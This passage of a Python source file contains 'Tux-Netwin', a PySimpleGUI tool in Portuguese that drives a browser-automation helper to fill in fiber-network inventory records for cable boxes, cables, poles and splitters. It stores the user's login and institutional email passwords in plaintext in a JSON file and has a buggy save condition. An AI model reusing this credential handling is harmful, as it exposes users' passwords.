import PySimpleGUI as sg
from algoritimo import *
from tqdm import tqdm
import requests
import socket

versao = '2.1.3'
navegador = Internet()

class app:
    def __init__(self):
        sg.theme('Reddit')
        menu_def = ['&Arquivo', ['&Nome de utilizador']],['&Equipamento',['&Cd_Comun','&Cd_Precom 1:8','&Cd_Precom 1:16','Hub/Ceos-p','Cdoi']],['&Cabo',['&Comun','&Precom','Primario']],['&Utilitario',['&Poste','&Conectividade 1:8','&Conectividade 1:16', '&Conectividade CDOI','&Abastecimento',
                                                                                                                                                                    '&As-Built','&Completa','Forms google']]

        self.layout_login = [
            [sg.Menu(menu_def,pad=(10,10))],
            [sg.Button('Web',size=(5,1)), sg.Text('INFRA',justification='c',size=(9,1)),sg.Button('Login',size=(6,1))],
            [sg.Combo(['Firefox','Chrome','Internet Explorer','Edge']),sg.Checkbox('V-tal',key='home')],
            ]

        window = sg.Window('Tux-Netwin', icon='tux-natal.ico',layout=self.layout_login, keep_on_top=True, finalize = True,size=(250,75))

        def celula():
            sg.theme('Reddit')
            self.layout_login = [
            [sg.Button('Voltar',size=(6,1)),sg.Text('Informações da celula',size=(20,1),justification = 'c')],
            [sg.Text('Nomenclatura',size=(13,1),justification = 'l'),sg.Input(size=(16,1))],
            [sg.Text('DC',size=(13,1),justification = 'l'),sg.Input(size=(16,1))],
            [sg.Text('ID-sicon',size=(13,1),justification = 'l'),sg.Input(size=(16,1))],
            [sg.Text('Cabo',size=(13,1),justification = 'l'),sg.Input(size=(7,1)),sg.Button('Ok',size=(5,1))]
            ]

            window = sg.Window('Tux-Netwin', icon='tux-natal.ico',layout=self.layout_login, keep_on_top=True, finalize = True,relative_location=(1825,736))

            while True:
                event,values = window.read()
                if event == sg.WIN_CLOSED or event == 'Sair': # if user closes window or clicks cancel
                    break

                if event == 'Voltar':
                    window.close()
                    programa = app()
                    programa 
                           
            window.close()

        def teste_metodos():
            sg.theme('Reddit')
            self.layout_login = [
                [sg.Button('Voltar',size=(5,1)),sg.Button('Operações',size=(10,1)),sg.Stretch(), sg.Text('Id Sicon:\t'),sg.Input(size=(15,1),key='id_sicon')], 
                [sg.Output(size=(45,4),key='senha')],
                [sg.Button('spliter',size=(7,1)),sg.Button('Conectividade',size=(13,1)),sg.Button('Endereço',size=(8,1)),sg.Button('Ativar',size=(7,1))]
                ]
            
            window = sg.Window('Nome do Utilizador', icon='tux-natal.ico',layout=self.layout_login, keep_on_top=True, finalize = True)

            while True:
                event,values = window.read()
                if event in (None, 'Sair'):
                    break 

                if event == 'Voltar':
                    window.close()
                    programa = app()
                    programa 

                if event == 'spliter':
                    navegador.Spliter_completa()
                 
                if event == 'Conectividade':
                    navegador.Conectividade_completa()
                
                if event == 'Ativar':
                    navegador.operacoes_mud_est(values['id_sicon'])
                    time.sleep(1.5)
                    navegador.Spliter_completa()
                    time.sleep(0.3)
                    navegador.Conectividade_completa()    
                    time.sleep(0.3)
                    navegador.atribuir_endereco()
                    
                if event == 'Operações':
                    navegador.operacoes_mud_est(values['id_sicon'])
                    
                if event == 'Endereço':
                    navegador.atribuir_endereco()
                    
            window.close()

        def forms_google():
            self.layout_login = [
                [sg.Button('Voltar',size=(5,1)),sg.Checkbox('Again',key='again'),sg.Stretch(),sg.Button('Forms',size=(10,1))],
                [sg.Text('Ang/Quant',size=(13,1),justification = 'l'),sg.Input(key='ang',size=(5,1)),sg.Input(key='quantidade',size=(5,1))],
                [sg.Text('Conectada',size=(13,1),justification = 'l'),sg.Input(key='conectada',size=(11,1))],
                [sg.Checkbox('Primario',key='primario'),sg.Stretch(),sg.Checkbox('Secundario',key='secundario')],
                [sg.Output(size=(30,4),key='senha')],
            ]
            
            window = sg.Window('Formulario', icon='tux-natal.ico',layout=self.layout_login, keep_on_top=True, finalize = True)

            while True:
                event,values = window.read()
                if event in (None, 'Sair'):
                    break 

                if event == 'Voltar':
                    window.close()
                    programa = app()
                    programa 
                
                if event == 'Forms':
                    try:
                        if values['primario']:
                            if values['again']:
                                navegador.preencher_form(values['ang'],values['conectada'],values['quantidade'],False)
                            else:
                                navegador.preencher_form(values['ang'],values['conectada'],values['quantidade'])

                        elif values['secundario']:
                            sg.popup_error('Um dia vai preencher o secundario\nConfia!!!', keep_on_top=True)

                        else:
                            sg.popup_error('Marque o flag primario ou secundario', keep_on_top=True)
                    except:
                        sg.popup_error('vishe O_O ', keep_on_top=True)
                        

            window.close()

        def nome_utilizador():
            sg.theme('Reddit')
            self.layout_login = [
                [sg.Text('Tux-Netwin',size=(20,1),justification=('c'))],
                [sg.Text('Nome:\t'),sg.Input(size=(15,1),key='nome')], 
                [sg.Text('Senha:\t'),sg.Input(size=(15,1),key='senha')],
                [sg.Text('Email Institucional',size=(20,1),justification=('c'))],
                [sg.Text('E-mail:\t'),sg.Input(size=(15,1),key='email')],
                [sg.Text('Senha:\t'),sg.Input(size=(15,1),key='senha_email')],
                [sg.Button('Voltar',size=(6,1)),sg.Button('Ok',size=(6,1))]
                ]

            window = sg.Window('Nome do Utilizador', icon='tux-natal.ico',layout=self.layout_login, keep_on_top=True, finalize = True)

            while True:
                event,values = window.read()
                if event == sg.WIN_CLOSED or event == 'Sair': # if user closes window or clicks cancel
                    break

                if event == 'Voltar':
                    window.close()
                    programa = app()
                    programa 

                if event == 'Ok':
                    if values['nome'] or values['senha'] == None:
                        dados = {
                            "login": values['nome'],
                            "senha": values['senha'],
                            "email": values['email'],
                            "senha_email": values['senha_email']
                        }
                        with open("credenciais.json", 'w') as file:
                            json.dump(dados, file, indent=4)
                    else:
                        window.close()
                        return app()

                    window.close()
                    programa = app()
                    programa 

                window.close()

        def janela_cdoe_precom():
                sg.theme('reddit') 
                layout_cdoe = [
                        [sg.Button('Voltar',size=(5,1)),sg.Text('1:8',size=(8,1),justification=('c')),sg.Button('Spliter',size=(8,1))],
                        [sg.Text('ID Sicom'), 
                        sg.Text(size=(0,1)),sg.Input(size=(8,1),key='ID Sicom'),sg.Checkbox('Proj', enable_events=False, key='projeto')], 
                        [sg.Text('Estação '), 
                        sg.Text(size=(0,1)),sg.Input(size=(8,1),key='Estação'),sg.Button('CDOE',size=(6,1))],  
                        [sg.Button('Alivio',size=(9,1)),sg.Checkbox('Fim/c', enable_events=False, key='Fim/c'),sg.Checkbox('TBD', enable_events=False, key='TBD')],
                        
                        ] 
                
                janela_cdoe_precon = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=layout_cdoe, keep_on_top=True, finalize = True) 

                while True:
                    event,values = janela_cdoe_precon.read()
                    if event in (None, 'Sair'):
                        break 
                    
                    if event == 'Voltar':
                        janela_cdoe_precon.close()
                        programa = app()
                        programa

                    if event == 'CDOE':
                        if values['projeto']:
                            if values['Fim/c']:
                                navegador.cdoe_precon(values['ID Sicom'],values['Estação'],True,None,True,True,False,False,True,False) 
                            else:
                                navegador.cdoe_precon(values['ID Sicom'],values['Estação'],True,None,True,False,True,False,True,False)
                        else:
                            if values['Fim/c']:
                                navegador.cdoe_precon(values['ID Sicom'],values['Estação'],True,None,True,True,False,False) 
                            else:
                                navegador.cdoe_precon(values['ID Sicom'],values['Estação'],True,None,True,False,True,False)

                    if event == 'Alivio':
                        if values['projeto']: 
                            if values['TBD']:
                                if values['Fim/c']:
                                    navegador.cdoe_precon(values['ID Sicom'],values['Estação'],True,None,True,True,False,False,False,False) 
                                else:
                                    navegador.cdoe_precon(values['ID Sicom'],values['Estação'],True,None,True,False,True,False,False,False)
                        else:
                            if values['Fim/c']:
                                navegador.cdoe_precon(values['ID Sicom'],values['Estação'],True,None,True,True,False,False,False) 
                            else:
                                navegador.cdoe_precon(values['ID Sicom'],values['Estação'],True,None,True,False,True,False,False)

                    if event == 'Spliter':
                        if values['Fim/c']:
                            navegador.componentes()  
                        else:
                            navegador.componentes(False)  
                            
                janela_cdoe_precon.close()

        def janela_Hub_ceos_p():
                sg.theme('reddit') 
                layout_cdoe = [
                        [sg.Button('Voltar',size=(5,1)),sg.Text(),sg.Button('Spliter',size=(8,1))],
                        [sg.Text('ID Sicom'),sg.Text(size=(0,1)),sg.Input(size=(18,1),key='id-sicom')], 
                        [sg.Text('Estação '),sg.Text(size=(0,1)),sg.Input(size=(5,1),key='estacao'),sg.Button('Ceos/p',size=(9,1))],
                        [sg.Text('Número'),sg.Text(size=(1,1)),sg.Input(size=(5,1),key='numero'),sg.Checkbox('Ceos P', enable_events=False, key='ceos_p')]  
                        ] 
                
                janela_cdoe_precon = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=layout_cdoe, keep_on_top=True, finalize = True) 

                while True:
                    event,values = janela_cdoe_precon.read()
                    if event in (None, 'Sair'):
                        break 
                    
                    if event == 'Voltar':
                        janela_cdoe_precon.close()
                        programa = app()
                        programa

                    if event == 'Ceos/p':
                        if values['ceos_p']:
                            navegador.hub_box_p(values['id-sicom'],values['estacao'],values['numero'],False)

                        else:
                            navegador.hub_box_p(values['id-sicom'],values['estacao'],values['numero'])

                    if event == 'Spliter':
                        if values['ceos_p']:
                            sg.popup_error('spliter da ceos p',keep_on_top=True)

                        else:
                            navegador.spliter_hub()


                janela_cdoe_precon.close()

        def janela_cdoi():
                sg.theme('reddit') 
                layout_cdoe = [
                        [sg.Button('Voltar',size=(5,1)),sg.Checkbox('>= 41 hp',key=('maior')),sg.Button('Spliter',size=(8,1))],
                        [sg.Text('ID Sicom'),sg.Text(size=(0,1)),sg.Input(size=(18,1),key='id-sicom')], 
                        [sg.Text('Estação '),sg.Text(size=(0,1)),sg.Input(size=(8,1),key='estacao'),sg.Button('CDOI',size=(7,1))],  
                        ] 
                
                janela_cdoe_precon = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=layout_cdoe, keep_on_top=True, finalize = True) 

                while True:
                    event,values = janela_cdoe_precon.read()
                    if event in (None, 'Sair'):
                        break 
                    
                    if event == 'Voltar':
                        janela_cdoe_precon.close()
                        programa = app()
                        programa

                    if event == 'CDOI':
                        if values['maior']:
                            navegador.cdoi(values['id-sicom'],values['estacao'],False)
                        else:
                            navegador.cdoi(values['id-sicom'],values['estacao'],True)

                    if event == 'Spliter':
                        if values['maior']:
                            navegador.spliter_cdoi()
                        else:
                            navegador.spliter_cdoi(False)

                janela_cdoe_precon.close()

        def janela_cdoe_precom_2022():
                sg.theme('reddit') 
                layout_cdoe = [
                        [sg.Button('Voltar',size=(5,1)),sg.Text('1:16',size=(8,1),justification=('c')),sg.Button('Spliter',size=(8,1))],
                        [sg.Text('ID Sicom'), 
                        sg.Text(size=(0,1)),sg.Input(size=(8,1),key='ID Sicom'),sg.Checkbox('Proj', enable_events=False, key='projeto')], 
                        [sg.Text('Estação '), 
                        sg.Text(size=(0,1)),sg.Input(size=(8,1),key='Estação'),sg.Button('CDOE',size=(6,1))],  
                        [sg.Button('Alivio',size=(9,1)),sg.Checkbox('Fim/c', enable_events=False, key='Fim/c'),sg.Checkbox('TBD', enable_events=False, key='TBD')],
                        
                        ] 
                
                janela_cdoe_precon = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=layout_cdoe, keep_on_top=True, finalize = True) 

                while True:
                    event,values = janela_cdoe_precon.read()
                    if event in (None, 'Sair'):
                        break 
                    
                    if event == 'Voltar':
                        janela_cdoe_precon.close()
                        programa = app()
                        programa
                    
                    if event == 'Spliter':
                        if values['Fim/c']:
                            navegador.componentes_2022()
                        else:
                            navegador.componentes_2022(False) 

                    if event == 'CDOE':
                        if values['projeto']:
                            if values['Fim/c']:
                                navegador.cdoe_precon_2022(values['ID Sicom'],values['Estação'],True,False,True,False,True,False)
                            else:
                                navegador.cdoe_precon_2022(values['ID Sicom'],values['Estação'],True,True,True,False,True,False)
                        else: 
                            if values['Fim/c']:
                                navegador.cdoe_precon_2022(values['ID Sicom'],values['Estação'],True,False,True,False)
                            else:
                                navegador.cdoe_precon_2022(values['ID Sicom'],values['Estação'],True,True,True,False)

                    if event == 'Alivio':  
                        if values['TBD']:
                            if values['projeto']:
                                if values['Fim/c']:
                                    navegador.cdoe_precon_2022(values['ID Sicom'],values['Estação'],True,False,True,False,False,False)
                                else:
                                    navegador.cdoe_precon_2022(values['ID Sicom'],values['Estação'],True,True,True,False,False,False)
                            else:
                                if values['Fim/c']:
                                    navegador.cdoe_precon_2022(values['ID Sicom'],values['Estação'],True,False,True,False,False)
                                else:
                                    navegador.cdoe_precon_2022(values['ID Sicom'],values['Estação'],True,True,True,False,False)

                janela_cdoe_precon.close()

        def janela_cdoe_comun():
                sg.theme('reddit') 
                layout_cdoe = [
                        [sg.Button('Voltar',size=(5,1)), sg.Stretch(), sg.Text('Criação de CDOE Comun')],
                        [sg.Text('ID Sicom'), 
                        sg.Text(size=(0,1)),sg.Input(size=(15,1),key='ID Sicom')], 
                        [sg.Text('Estação '), 
                        sg.Text(size=(0,1)),sg.Input(size=(15,1),key='Estação')],  
                        [ sg.Button('CDOE_8-48FS',size=(12,1)), sg.Button('CDOE_16-48FS',size=(12,1))],
                        [sg.Text('---Quebrar Traçado---',size=(20,1),justification='c'),sg.Checkbox('Sob ', enable_events=False, key='Checkbox')],
                        [sg.Button('CDOE_8-48FQ',size=(12,1)), sg.Button('CDOE_16-48FQ',size=(12,1))],
                        [sg.Button('Sair',size=(5,1)),sg.Button('Spliter',size=(5,1)),sg.Text('Num-Est',justification='c'),sg.Input(key='num',size=(4,1))]
                        ] 
                
                janela_cdoe_comun = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=layout_cdoe, keep_on_top=True, finalize = True) 

                while True:
                    event,values = janela_cdoe_comun.read()
                    if event in (None, 'Sair'):
                        break 
                    
                    if event == 'Voltar':
                        janela_cdoe_comun.close()
                        programa = app()
                        programa
                    
                    if event == 'CDOE_8-48FS':
                        navegador.cdoe_comun(values['ID Sicom'],values['Estação'],values['num'],True)
                        navegador.cdoe_comun(values['ID Sicom'],values['Estação'],values['num'],True,False)
                         
                    if event == 'CDOE_16-48FS':
                        navegador.cdoe_comun(values['ID Sicom'],values['Estação'],values['num'],True)
                        navegador.cdoe_comun(values['ID Sicom'],values['Estação'],values['num'],False,False)
                        
                    if event == 'CDOE_8-48FQ':
                        navegador.cdoe_comun(values['ID Sicom'],values['Estação'],values['num'],True,False)
                        
                    if event == 'CDOE_16-48FQ':
                        navegador.cdoe_comun(values['ID Sicom'],values['Estação'],values['num'],False,False)

                janela_cdoe_comun.close()  

        def cabo_comun():
            sg.theme('Reddit')
            cabo_layout = [
                            [sg.Button('Voltar',size=(5,1)), sg.Stretch(), sg.Text('Cabo Comun')],
                            [sg.Text('ID Sicom \t'), 
                            sg.Text(size=(0,1)),sg.Input(size=(15,1),key='ID Sicom')],
                            [sg.Text('Cabo primário\t'), 
                            sg.Text(size=(0,1)),sg.Input(size=(15,1),key='num_pri')],
                            [sg.Text('Nó de orige\t'), 
                            sg.Text(size=(0,1)),sg.Input(size=(15,1),key='num_ori')],
                            [sg.Text('Cabo secundário\t'), 
                            sg.Text(size=(0,1)),sg.Input(size=(15,1),key='num_sec')],
                            [sg.Button('Sair',size=(5,1)),sg.Button('Cabo',size=(11,1)),sg.Button('None',size=(11,1))]  
            ]
            
            cabo_comun = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=cabo_layout, keep_on_top=True, finalize = True)
            
            while True:
                event,values = cabo_comun.read()
                if event in (None, 'Sair'):
                    break 
                    
                if event == 'Voltar':
                    cabo_comun.close()
                    programa = app()
                    programa   
       
            cabo_comun.close()  

        def cabo_precom():
            sg.theme('Reddit')
            cabo_layout = [
                            [sg.Button('Voltar',size=(5,1)),sg.Text('Cabo Precom',justification=('c'),size=(13,1)),sg.Stretch(),sg.Button('Cabo',size=(7,1))],
                            [sg.Text('ID Sicom \t'),sg.Text(size=(0,1)),sg.Input(size=(15,1),key='ID Sicom')],
                            [sg.Text('Primario/Nó \t'),sg.Text(size=(0,1)),sg.Input(size=(6,1),key='num_pri'),sg.Stretch(),sg.Input(size=(6,1),key='num_ori')],
                            [sg.Text('Cabo secundário\t'),sg.Text(size=(0,1)),sg.Input(size=(6,1),key='num_sec'),sg.Stretch(),sg.Checkbox('Proj', enable_events=False, key='projeto')],
                            [sg.Text('Comprimento\t'),sg.Text(size=(0,1)),sg.Input(size=(15,1),key='Comprimento')],  
            ]
            
            window = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=cabo_layout, keep_on_top=True, finalize = True)
            
            while True:
                event,values = window.read()
                if event in (None, 'Sair'):
                    break 
                    
                if event == 'Voltar':
                    window.close()
                    programa = app()
                    programa   

                if event == 'Cabo':
                    if values['projeto']:
                        navegador.cabo_precon(values['ID Sicom'],values['num_pri'],values['num_ori'],values['num_sec'],values['Comprimento'],False,True,False)
                    else:
                        navegador.cabo_precon(values['ID Sicom'],values['num_pri'],values['num_ori'],values['num_sec'],values['Comprimento'],False,True)

            window.close()

        def conectivade():
            sg.theme('Reddit')
            conectividade_layout = [
                            [sg.Button('Voltar',size=(5,1)),sg.Text('1:8',size=(7,1),justification='c') ,  sg.Stretch(),sg.Checkbox('Reverso', enable_events=False, key='rev')],
                            [sg.Button('Conectividade',size=(11,1)),sg.Stretch(),sg.Button('Conectar_p',size=(10,1))],
                            [sg.Checkbox('S2-1', enable_events=False, key='S2-1'),sg.Checkbox('Tipo 1', enable_events=False, key='Tipo-1'), sg.Checkbox('Tipo 2', enable_events=False, key='Tipo-2')]   
            ]
            
            cabo_precon = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=conectividade_layout, keep_on_top=True, finalize = True)
            
            while True:
                event,values = cabo_precon.read()
                if event == sg.WIN_CLOSED or event == 'Sair': # if user closes window or clicks cancel
                    break
                 
                if event == 'Voltar':
                    cabo_precon.close()
                    programa = app()
                    programa   

                
                if event == 'Conectar_p':
                    if values['Tipo-1']:
                        if values['rev']:
                            navegador.conectividade(True,False)
                        else:
                            navegador.conectividade()
                    elif values['Tipo-2']:
                        if values['rev']:
                            navegador.conectividade(False,False)
                        else:
                            navegador.conectividade(False)
                    else:
                        navegador.conectividade_1_8()

                if event == 'Conectividade':
                        if values['S2-1']:
                            if values['rev']:
                                navegador.conectividade(True,False)
                                time.sleep(1.5)
                                navegador.conectividade(False,False)
                            else:
                                navegador.conectividade()
                                time.sleep(1.5)
                                navegador.conectividade(False)
                        else:
                            sg.popup('Selecione um Spliter/Reverso', keep_on_top=True)

            window.close()

        def conectivade_2022():
            sg.theme('Reddit')
            conectividade_layout = [
                            [sg.Button('Voltar',size=(5,1)),sg.Text('1:16',size=(7,1),justification='c') ,  sg.Stretch(),sg.Checkbox('Reverso', enable_events=False, key='rev')],
                            [sg.Button('Conectividade',size=(11,1)),sg.Stretch(),sg.Button('Conectar_p',size=(10,1))],
                            [sg.Checkbox('S16-1', enable_events=False, key='S16-1'),sg.Checkbox('Tipo 1', enable_events=False, key='Tipo-1'), sg.Checkbox('Tipo 2', enable_events=False, key='Tipo-2')]   
            ]
            
            cabo_precon = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=conectividade_layout, keep_on_top=True, finalize = True)
            
            while True:
                event,values = cabo_precon.read()
                if event == sg.WIN_CLOSED or event == 'Sair': # if user closes window or clicks cancel
                    break
                 
                if event == 'Voltar':
                    cabo_precon.close()
                    programa = app()
                    programa   
                    
                if event == 'Conectar_p':
                    if values['Tipo-1']:
                        if values['rev']:
                            navegador.conectividade_2022(True,False)
                        else:
                            navegador.conectividade_2022()
                    elif values['Tipo-2']:
                        if values['rev']:
                            navegador.conectividade_2022(False,False)
                        else:
                            navegador.conectividade_2022(False)
                    else:
                        navegador.conectividade_1_8(False)
                        
        
                if event == 'Conectividade':
                        if values['S16-1']:
                            if values['rev']:
                                navegador.conectividade_2022(True,False)
                                time.sleep(1.5)
                                navegador.conectividade_2022(False,False)
                            else:
                                navegador.conectividade_2022()
                                time.sleep(1.5)
                                navegador.conectividade_2022(False)
                        else:
                            sg.popup('Selecione um Spliter/Reverso', keep_on_top=True)
            window.close()

        def as_built():
            sg.theme('Reddit')
            as_built_layout = [
                [sg.Button('Voltar',size=(5,1)), sg.Stretch(), sg.Text('As - Built Cabo/Estação')],
                [sg.Text('Id_Cdoe'),sg.Input(size = (15,1),key='cdoe'),sg.Checkbox('S/N',key='Checkbox')],
                [sg.Button('Procurar',size=(12,1)),sg.Button('Estação-AsBuilt',size=(12,1))],
                [sg.Button('Cabo-AsBuilt',size=(12,1)),sg.Button('Sob Demanda',size=(12,1))],
                            
            ]
            
            as_built = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=as_built_layout, keep_on_top=True, finalize = True)
            
            while True:
                event,values = as_built.read()
                if event in (None, 'Sair'):
                    break 
                    
                if event == 'Voltar':
                    as_built.close()
                    programa = app()
                    programa
                        
                if event == 'Estação-AsBuilt':
                    navegador.mudar_status_estacao()
                    
                if event == 'Sob Demanda':
                    navegador.sob_demanda()
                
                if event == 'Cabo Parcial':
                    if values['Checkbox']:
                        navegador.mudar_status_cabo()
                    else:
                        navegador.mudar_status_cabo_1()
                
                if event == 'Procurar':
                    navegador.encontrar(values['cdoe']) 
                    
                if event == 'Cabo-AsBuilt':
                    navegador.mudar_status_cabo_completo()
                
                if event == 'Gpon':
                    navegador.mudar_status_cabo_gpon()      
            as_built.close()

        def poste():
            sg.theme('Reddit')
            poste_layout = [
                            [sg.Button('Voltar',size=(5,1)),sg.Text('Poste',size=(11,1),justification=('c')),sg.Button('Traçado',size=(11,1))],
                            [sg.Text('ID Sicom',size=(11,1)),sg.Input(size=(21,1),key='id-sicom')],
                            [sg.Text('Capa/Forn',size=(11,1)),sg.Input(size=(8,1),key='capacidade'),sg.Input(size=(11,1),key='fornecedor')],
                            [sg.Button('Poste',size=(8,1)),sg.Checkbox('CC',key='cc'),sg.Checkbox('CdT',key='cdt'),sg.Button('Tipo 2',size=(6,1))]  
            ]
            
            poste = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=poste_layout, keep_on_top=True, finalize = True)
            
            while True:
                event,values = poste.read()
                if event in (None, 'Sair'):
                    break 
                    
                if event == 'Voltar':
                    poste.close()
                    programa = app()
                    programa
                        
                if event == 'Poste':
                    if values['cdt']:
                        navegador.poste(values['capacidade'],values['fornecedor'],values['id-sicom'],False,True,True,False)

                    elif values['cc']:
                        navegador.poste(values['capacidade'],values['fornecedor'],values['id-sicom'],False,True,True,False,True,False)
                    else:
                        sg.popup('Marque o flag \nCC para Concreto Circular ou \nCdT para Concreto duplo T', keep_on_top=True)

                if event == 'Tipo 2':
                    if values['cdt']:
                        navegador.poste(values['capacidade'],values['fornecedor'],values['id-sicom'],False,True,True,False,False,False)

                    elif values['cc']:
                        navegador.poste(values['capacidade'],values['fornecedor'],values['id-sicom'],False,True,True,False,False,False,False)

                    else:
                        sg.popup('Marque o flag \nCC para Concreto Circular ou \nCdT para Concreto duplo T', keep_on_top=True)
                
                if event == 'Traçado':  
                        navegador.traçado(values['id-sicom'],False,False)

            poste.close()

        def abastecimento():  
            sg.theme('Reddit')
            layout = [
            [sg.Button('Voltar',size=(6,1)),sg.Text('Abastecimento',size=(20,1),justification = 'c')],
            [sg.Multiline("",key="casa",size=(32,5))],
            [sg.Button('Inicio',size=(13,1))]
            ]

            window = sg.Window('Tux-Netwin', icon='tux-natal.ico',layout=layout,finalize = True, keep_on_top=True)

            while True:
                event,values = window.read()
                if event == sg.WIN_CLOSED or event == 'Sair': # if user closes window or clicks cancel
                    break

                if event == 'Voltar':
                    window.close()
                    programa = app()
                    programa 

                if event == 'Caminho':
                    #navegador.endereco()
                    pass
                if event == 'Inicio':
                    navegador.abastecimento(values['casa'])

            window.close()

        def cabo_primario():
            sg.theme('Reddit')
            cabo_layout = [
                            [sg.Button('Voltar',size=(5,1)),sg.Checkbox('N/Proj',key='nome projeto'),sg.Stretch(), sg.Checkbox('288',key='288')],
                            [sg.Text('ID Sicom '),sg.Text(size=(0,1)),sg.Input(size=(15,1),key='id_sicom')],
                            [sg.Text('Primario \t'),sg.Text(size=(0,1)), sg.Input(size=(7,1),key='num_pri'),sg.Button('Cabo',size=(5,1))],
                            [sg.Checkbox('12',key='12'),sg.Checkbox('36',key='36'),sg.Checkbox('72',key='72'),sg.Checkbox('144',key='144')],           
                            ]
            
            window = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=cabo_layout, keep_on_top=True, finalize = True)
            
            while True:
                event,values = window.read()
                if event in (None, 'Sair'):
                    break 
                    
                if event == 'Voltar':
                    window.close()
                    programa = app()
                    programa

                if event == 'Cabo':
                    if values['nome projeto']:
                        if values['12']:
                            navegador.cabo_primario(values['id_sicom'],values['num_pri'],True,False,False,False,False,False,False,False)
                        elif values['36']:
                            navegador.cabo_primario(values['id_sicom'],values['num_pri'],False,False,True,False,False,False,False,False)
                        elif values['72']:
                            navegador.cabo_primario(values['id_sicom'],values['num_pri'],False,False,False,False,True,False,False,False)    
                        elif values['144']:    
                            navegador.cabo_primario(values['id_sicom'],values['num_pri'],False,False,False,False,False,True,False,False)
                        elif values['288']:    
                            navegador.cabo_primario(values['id_sicom'],values['num_pri'],False,False,False,False,False,False,True,False)
                        else:
                            sg.popup_error('Marque alguma Flag\n','12, 36, 72, 144, 288',keep_on_top=True)   
                            
                    elif values['12']:
                        navegador.cabo_primario(values['id_sicom'],values['num_pri'],True)
                    elif values['36']:
                        navegador.cabo_primario(values['id_sicom'],values['num_pri'],False,False,True)
                    elif values['72']:
                        navegador.cabo_primario(values['id_sicom'],values['num_pri'],False,False,False,False,True)    
                    elif values['144']:    
                        navegador.cabo_primario(values['id_sicom'],values['num_pri'],False,False,False,False,False,True)
                    elif values['288']:    
                        navegador.cabo_primario(values['id_sicom'],values['num_pri'],False,False,False,False,False,False,True)
                        
                    else:
                        sg.popup_error('Marque alguma Flag\n','12, 36, 72, 144, 288',keep_on_top=True)
            window.close()

        def conectividade_cdoi():
            sg.theme('Reddit')
            conectividade_layout = [
                            [sg.Button('Voltar',size=(5,1)),sg.Text('CDOI') , sg.Stretch()],
                            [sg.Button('Conectividade',size=(11,1)),sg.Stretch()],
                            [sg.Checkbox('64 hp', enable_events=False, key='64'),sg.Checkbox('Splitada', enable_events=False, key='splitada')]   
            ]
            
            cabo_precon = sg.Window('Tux-Netwin', icon='tux-natal.ico', layout=conectividade_layout, keep_on_top=True, finalize = True)
            
            while True:
                event,values = cabo_precon.read()
                if event == sg.WIN_CLOSED or event == 'Sair': # if user closes window or clicks cancel
                    break
                 
                if event == 'Voltar':
                    cabo_precon.close()
                    programa = app()
                    programa   
                
                if event == 'Conectividade':
                    if values['64']:
                        sg.popup_error('Use Completa para fazer a conectividade\n da cdoi e cdoe', keep_on_top=True)

                    elif values['splitada']:
                        sg.popup_error('Use Completa para fazer a conectividade\n da cdoi e cdoe', keep_on_top=True)

                    else:
                        sg.popup_error('Marque o flag 64/splitada', keep_on_top=True)

            window.close()
        while True:
            event,values = window.read()
            if event == sg.WIN_CLOSED or event == 'Sair': # if user closes window or clicks cancel
                break
            
            if event == 'Web':
                try:
                    if values['home']:
                        if values[1] == 'Firefox':
                            navegador.navegador_driver(False,False,False)
                        elif values[1] == 'Chrome':
                            navegador.navegador_driver(False,True,False) 
                        elif values[1] == 'Internet Explorer':
                            navegador.navegador_driver(False,False,True)
                        elif values[1] == 'Edge':
                            navegador.navegador_driver(True,False,False)
                        else:
                            sg.popup_error('Selecione um navegador', keep_on_top=True) 
                    else:
                        if values[1] == 'Firefox':
                            navegador.navegador_driver(False,False,False,False)
                        elif values[1] == 'Chrome':
                            navegador.navegador_driver(False,True,False,False) 
                        elif values[1] == 'Internet Explorer':
                            navegador.navegador_driver(False,False,True,False)
                        elif values[1] == 'Edge':
                            navegador.navegador_driver(True,False,False,False)  
                        else:
                            sg.popup_error('Selecione um navegador', keep_on_top=True) 
                except:
                    sg.popup('Tente Novamente', keep_on_top=True)

            if event == 'Nome de utilizador':
                window.close()
                nome_utilizador()

            if event == 'Cd_Precom 1:8':
                window.close()
                janela_cdoe_precom()

            if event == 'Cd_Precom 1:16':
                window.close()
                janela_cdoe_precom_2022()

            if event == 'Cd_Comun':
                window.close()
                janela_cdoe_comun()
            
            if event == 'Comun':
                window.close()
                cabo_comun()

            if event == 'Precom':
                window.close()
                cabo_precom()

            if event == 'Poste':
                window.close()
                poste()

            if event == 'Celula':
                window.close()
                celula()

            if event == 'Conectividade 1:8':
                window.close()
                conectivade()

            if event == 'As-Built':
                window.close()
                as_built()

            if event == 'Abastecimento':
                window.close()
                abastecimento()
                
            if event == 'Login':
                navegador.entrar_driver()
        
            if event == 'Procurar':
                navegador.procurar_estação(values['estacao'])

            if event == 'Procurar denovo':
                navegador.procurar_estação(values['estacao'],False)

            if event == 'Conectividade 1:16':
                window.close()
                conectivade_2022()

            if event == 'Hub/Ceos-p':
                window.close()
                janela_Hub_ceos_p()

            if event == 'Cdoi':
                window.close()
                janela_cdoi()

            if event == 'Primario':
                window.close()
                cabo_primario()

            if event == 'Conectividade CDOI':
                window.close()
                conectividade_cdoi()
                
            if event == 'Completa':
                window.close()
                teste_metodos()
            if event == 'Forms google':
                window.close()
                forms_google()

        window.close()

if __name__ == '__main__':
    try:
        sg.popup_notify('Aguarde..')
        try:
            with open("credenciais.json", encoding='utf-8') as meu_json:
                        dado = json.load(meu_json)
            from selenium.webdriver.firefox.options import Options 
            ip_local = socket.gethostbyname(socket.gethostname())
            ip_publico = requests.get('https://api.ipify.org/').text 
            info = dado['email']   
            tr = dado['login']
            senha = dado['senha']
        
        except:
            sg.theme('Reddit')
            layout_login = [
                [sg.Text('Tux-Netwin',size=(20,1),justification=('c'))],
                [sg.Text('Nome:*\t'),sg.Input(size=(15,1),key='nome')], 
                [sg.Text('Senha:*\t'),sg.Input(size=(15,1),key='senha')],
                [sg.Text('Email Institucional',size=(20,1),justification=('c'))],
